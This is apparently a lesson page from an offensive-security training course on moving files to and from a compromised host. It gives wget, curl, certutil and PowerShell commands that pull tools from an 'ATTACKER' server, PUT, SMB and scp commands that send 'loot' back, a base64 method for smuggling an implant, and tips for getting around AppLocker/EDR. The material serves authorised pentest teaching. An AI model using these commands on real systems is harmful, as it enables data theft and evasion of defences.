---
title: Move files on and off the box
slug: file-transfers
area: initial-access
module: 7
order: 2
goal: Upload a tool to the target, or pull loot back, on Windows or Linux — including when there's no internet.
summary: How to transfer files both ways — HTTP server + wget/curl/certutil/PowerShell, SMB and base64 fallbacks for when the usual tools are missing or egress is blocked.
prereqs: [A shell on the target, Your attack box IP, A listener/server on your side (python http.server, impacket smbserver, or nc)]
seeAlso: [tool:file-transfer, tool:transfer-channels, tool:transfer-with-code, tool:impacket, map:start]
references:
  - HackTricks: file transfer / exfiltration | https://book.hacktricks.wiki/en/generic-methodologies-and-resources/exfiltration.html
  - Living Off The Land Binaries | https://lolbas-project.github.io/
---

Half of a pentest is moving a binary onto a host or dragging loot back. Start the simplest server on your box, then reach for whatever download tool the target actually has.

## Serve from your attack box

```bash
python3 -m http.server 8000                          # HTTP
impacket-smbserver share . -smb2support              # SMB (add -user/-password for auth)
nc -lvnp 9001 > loot.zip                              # catch a file over raw TCP
```

## Download onto the target

```bash
# Linux
wget http://ATTACKER:8000/linpeas.sh -O /tmp/lp.sh
curl http://ATTACKER:8000/linpeas.sh -o /tmp/lp.sh
```

```cmd
:: Windows
certutil -urlcache -split -f http://ATTACKER:8000/nc.exe nc.exe
powershell -c "Invoke-WebRequest http://ATTACKER:8000/nc.exe -OutFile nc.exe"
copy \\ATTACKER\share\nc.exe nc.exe
```

## Pull loot back

```cmd
powershell -c "Invoke-WebRequest -Uri http://ATTACKER:8000/up -Method PUT -InFile loot.zip"
copy loot.zip \\ATTACKER\share\loot.zip
```

```bash
scp loot.zip user@ATTACKER:/tmp/            # if SSH out is allowed
```

## No tools / no egress — encode it

When downloads are blocked, paste the file through the shell as base64.

```bash
base64 -w0 implant.bin                        # on the source, copy the string
echo <b64> | base64 -d > implant.bin          # Linux target
```

```powershell
[IO.File]::WriteAllBytes("implant.bin",[Convert]::FromBase64String("<b64>"))
```

## If it fails

- **Download hangs / refused**: egress is firewalled — switch port (443/53), use SMB instead of HTTP, or fall back to base64 paste.
- **certutil/powershell blocked** by AppLocker/EDR: try another LOLBin (bitsadmin, curl.exe on modern Windows), or SMB.
- **SMB copy denied**: add `-user`/`-password` to smbserver and authenticate, or use `-smb2support` for newer Windows.
- **Corrupt binary**: you transferred it as text — use binary mode / base64, not copy-paste of raw bytes.

## Verify

```bash
md5sum file          # Linux  — compare both ends
certutil -hashfile file MD5   # Windows
```
